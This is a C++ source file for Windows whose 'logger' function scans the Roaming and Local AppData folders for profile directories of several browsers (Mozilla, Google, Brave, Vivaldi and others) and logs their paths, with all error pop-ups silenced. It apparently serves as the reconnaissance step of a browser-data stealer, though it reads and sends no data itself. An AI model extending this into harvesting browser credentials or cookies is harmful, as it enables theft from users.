#include <algorithm>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <shlobj.h>

#include "logger.h"

void log_folders_in_path(const std::string& base_path, const std::vector<std::string>& target_folders, std::ofstream& ofs) {
    try {
        for (const auto& entry : std::filesystem::directory_iterator(base_path)) {
            if (entry.is_directory()) {
                std::string folder_name = entry.path().filename().string();

                if (std::find(target_folders.begin(), target_folders.end(), folder_name) != target_folders.end()) {
                    ofs << entry.path().string() << std::endl;
                }
            }
        }
    }
    catch (const std::filesystem::filesystem_error& e) {
        // MessageBox(NULL, e.what(), "Filesystem Error", MB_OK | MB_ICONWARNING);
    }
}

void logger::log_appdata_folders(const std::string& log_file) {
    char roaming_path[MAX_PATH];
    char local_path[MAX_PATH];

    std::vector<std::string> target_folders = { "Mozilla", "zen", "Floorp", "Google", "Brave", "Vivaldi" };

    bool roaming_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming_path));
    bool local_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_path));

    if (!roaming_ok && !local_ok) {
        // MessageBox(NULL, "Appdata directories not found!", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    std::ofstream ofs(log_file, std::ios::out | std::ios::trunc);
    if (!ofs.is_open()) {
        // MessageBox(NULL, "Log file could not be opened!", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (roaming_ok) {
        log_folders_in_path(roaming_path, target_folders, ofs);
    }

    if (local_ok) {
        log_folders_in_path(local_path, target_folders, ofs);
    }

    ofs.close();
}

/*
Roaming (CSIDL_APPDATA)
Local (CSIDL_LOCAL_APPDATA)
LocalLow (CSIDL_LOCAL_APPDATA)
*/